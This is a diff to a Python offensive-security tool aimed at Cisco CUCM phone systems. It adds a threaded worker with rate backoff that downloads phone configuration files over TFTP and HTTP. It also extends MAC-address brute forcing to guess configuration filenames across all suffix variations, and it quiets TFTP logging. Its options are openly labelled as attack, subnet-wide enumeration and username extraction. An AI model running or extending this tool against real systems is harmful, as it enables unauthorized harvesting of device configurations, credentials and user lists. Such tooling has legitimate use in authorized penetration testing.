@@ -187,6 +187,117 @@ def download_config_tftp(cucm_host, filename, timeout=5):
             pass
 
 
+class TFTPBackoffManager:
+    """Manages TFTP request rate with automatic backoff on errors."""
+
+    def __init__(self):
+        self.error_count = 0
+        self.consecutive_errors = 0
+        self.last_error_time = 0
+        self.delay = 0.0
+        self.lock = threading.Lock()
+
+    def record_success(self):
+        with self.lock:
+            self.consecutive_errors = 0
+            if self.delay > 0:
+                self.delay = max(0, self.delay - 0.01)
+
+    def record_error(self):
+        with self.lock:
+            self.error_count += 1
+            self.consecutive_errors += 1
+            self.last_error_time = time.time()
+
+            if self.consecutive_errors > 10:
+                self.delay = min(5.0, self.delay + 0.5)
+            elif self.consecutive_errors > 5:
+                self.delay = min(2.0, self.delay + 0.1)
+
+    def get_delay(self):
+        with self.lock:
+            return self.delay
+
+
+def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_manager, no_db, db_file, force_download):
+    """
+    Worker thread for downloading config files.
+    """
+    while True:
+        try:
+            task = work_queue.get(timeout=1)
+            if task is None:  # Poison pill to stop worker
+                work_queue.task_done()
+                break
+
+            task_cucm = CUCM_host
+            if len(task) == 4:
+                index, full_mac, filename, task_cucm = task
+            else:
+                index, full_mac, filename = task
+
+            if not task_cucm:
+                results_queue.put((index, full_mac, None, 'NO_CUCM', False))
+                work_queue.task_done()
+                continue
+
+            # Check cache first (unless force flag is set or --no-db)
+            if not force_download and not no_db:
+                was_attempted, was_successful, cached_content = check_already_attempted(task_cucm, filename, db_file)
+                if was_attempted:
+                    if was_successful and cached_content:
+                        results_queue.put((index, full_mac, cached_content, 'CACHED', True))
+                    else:
+                        results_queue.put((index, full_mac, None, 'CACHED', True))
+                    work_queue.task_done()
+                    continue
+
+            # Apply backoff delay if needed
+            delay = backoff_manager.get_delay()
+            if delay > 0:
+                time.sleep(delay)
+
+            # Try download
+            method = 'TFTP' if use_tftp else 'HTTP'
+            content = None
+
+            try:
+                if use_tftp:
+                    content = download_config_tftp(task_cucm, filename)
+                    if content is None:
+                        content = download_config_http(task_cucm, filename)
+                        method = 'HTTP' if content else 'TFTP+HTTP'
+                else:
+                    content = download_config_http(task_cucm, filename)
+                    if content is None:
+                        content = download_config_tftp(task_cucm, filename)
+                        method = 'TFTP' if content else 'HTTP+TFTP'
+
+                if content:
+                    backoff_manager.record_success()
+                else:
+                    backoff_manager.record_error()
+
+            except Exception as e:
+                backoff_manager.record_error()
+                if globals().get('debug', False):
+                    print(f'[!] Worker error downloading {filename}: {str(e)}')
+
+            # Log the attempt (unless --no-db)
+            if not no_db:
+                log_download_attempt(task_cucm, filename, content is not None, method, content, db_file)
+
+            results_queue.put((index, full_mac, content, method, False))
+            work_queue.task_done()
+
+        except queue.Empty:
+            continue
+        except Exception as e:
+            if globals().get('debug', False):
+                print(f'[!] Worker exception: {str(e)}')
+            work_queue.task_done()
+
+
 def get_version(cucm_host):
     if not cucm_host:
         return None
@@ -862,7 +973,7 @@ if __name__ == '__main__':
     parser.add_argument('-e','--enumsubnet', type=str, help='Enumerate and attack entire subnet in CIDR notation (e.g., 192.168.1.0/24)')
     
     # Attack Options
-    parser.add_argument('-b','--brute-mac', action='store_true', default=False, help='Brute force all MAC address variations (00-FF) for detected phone prefixes')
+    parser.add_argument('-b','--brute-mac', nargs='?', const=True, default=False, type=str, help='Brute force all MAC address variations for detected phone prefixes. Optionally specify number of suffix characters (e.g., -b 4 for last 4 chars, default: 3)')
     parser.add_argument('--force', action='store_true', default=False, help='Bypass cache and force re-download of all configuration files')
     parser.add_argument('--userenum', action='store_true', default=False, help='Extract usernames via CUCM User Data Services (UDS) API')
     
@@ -908,7 +1019,16 @@ if __name__ == '__main__':
     debug = args.debug
     
     enumsubnet = args.enumsubnet
-    brute_mac = args.brute_mac
+    # Determine brute force suffix length
+    if args.brute_mac is True or args.brute_mac is False:
+        brute_mac = bool(args.brute_mac)
+        brute_mac_len = 3
+    else:
+        brute_mac = True
+        try:
+            brute_mac_len = int(args.brute_mac)
+        except Exception:
+            brute_mac_len = 3
     csv_output = args.csv
     db_file = args.db
     no_db = args.no_db
@@ -929,6 +1049,12 @@ if __name__ == '__main__':
         logging.getLogger('tftpy.TftpContexts').setLevel(logging.DEBUG)
         logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.DEBUG)
         logging.getLogger('tftpy').setLevel(logging.DEBUG)
+    else:
+        # Silence noisy TFTP warnings unless --debug is enabled
+        logging.getLogger('tftpy.TftpClient').setLevel(logging.CRITICAL)
+        logging.getLogger('tftpy.TftpContexts').setLevel(logging.CRITICAL)
+        logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.CRITICAL)
+        logging.getLogger('tftpy').setLevel(logging.CRITICAL)
 
     get_version(CUCM_host)
 
@@ -938,7 +1064,7 @@ if __name__ == '__main__':
             print('You must specify at least one phone with -p when using --brute-mac')
             quit(1)
         
-        print(f'MAC brute force mode enabled for {len(phones)} phone(s)\n')
+        print(f'MAC brute force mode enabled for {len(phones)} phone(s) with suffix length {brute_mac_len}\n')
         
         # Map each MAC prefix to its CUCM server
         mac_to_cucm = {}
@@ -1009,13 +1135,12 @@ if __name__ == '__main__':
         # Build combined list of all MAC candidates from all phones
         print(f'Building randomized candidate list for {len(all_found_macs)} MAC prefix(es)...')
         all_candidates = []
-        
+        max_variations = 16 ** brute_mac_len
         for partial_mac in all_found_macs:
             phone_cucm = mac_to_cucm[partial_mac]
-            # Generate all 4096 variations for this MAC prefix
-            for i in range(4096):
-                last_three_chars = f'{i:03X}'
-                full_mac = partial_mac + last_three_chars
+            for i in range(max_variations):
+                suffix = f'{i:0{brute_mac_len}X}'
+                full_mac = partial_mac + suffix
                 filename = f'SEP{full_mac}.cnf.xml'
                 all_candidates.append((phone_cucm, full_mac, filename))
         
